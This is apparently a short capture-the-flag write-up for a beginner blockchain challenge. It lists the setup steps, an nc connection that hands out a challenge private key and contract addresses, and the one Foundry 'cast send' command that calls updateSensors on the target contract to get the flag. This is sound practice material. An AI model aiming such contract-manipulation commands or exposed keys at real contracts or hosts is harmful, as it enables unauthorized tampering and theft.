Description: 
Your advanced sensory systems make it easy for you to navigate familiar environments, but you must rely on intuition to navigate in unknown territories. Through practice and training, you must learn to read subtle cues and become comfortable in unpredictable situations. Can you use your software to find your way through the blocks?

Downloaded blockchain_navigating_the_unknown.zip file
- unzip blockchain_navigating_the_unknown.zip
	- contains 'README.md', 'setup.sol', 'contract.sol' files

Read the contents of the README.md file

- explains that this challenge is made for beginners that have never worked with blockchains before
  
- explains concepts of how blockchains work and what info is needed for attack vectors
  
- suggested tools to use for attacking blockchain

REF: https://github.com/foundry-rs/foundry/blob/master/README.md

- Installed foundry-rs CLI tool into Kali Linux VM

- nc 165.227.224.40 32867

Entered 1 to get information for interacting with blockchains

Private key     :  0xf6a5fb4307ba12df2941834f5f05ae2b057adcbaa5ee3e62b9e28573a49001f4
Address         :  0xb90FE0a8e7E7868EA652E726ed8eAc12cD04425c
Target contract :  0xb21d66ce599745360207FAa4c7bc4Db48f0F75Dd
Setup contract  :  0xFc6eeB8bcE44a9792d530E88EeA95D1Fd62A580


Researched a bit on previous blockchain CTF challenges

- REF: https://medium.com/amber-group/web3-hacking-paradigm-ctf-2022-writeup-3102944fd6f5

```
cast send 0xb21d66ce599745360207FAa4c7bc4Db48f0F75Dd "updateSensors(uint256)" 10 --private-key 0xf6a5fb4307ba12df2941834f5f05ae2b057adcbaa5ee3e62b9e28573a49001f4 --rpc-url http://165.227.224.40:30052
```

RETRIEVED FLAG
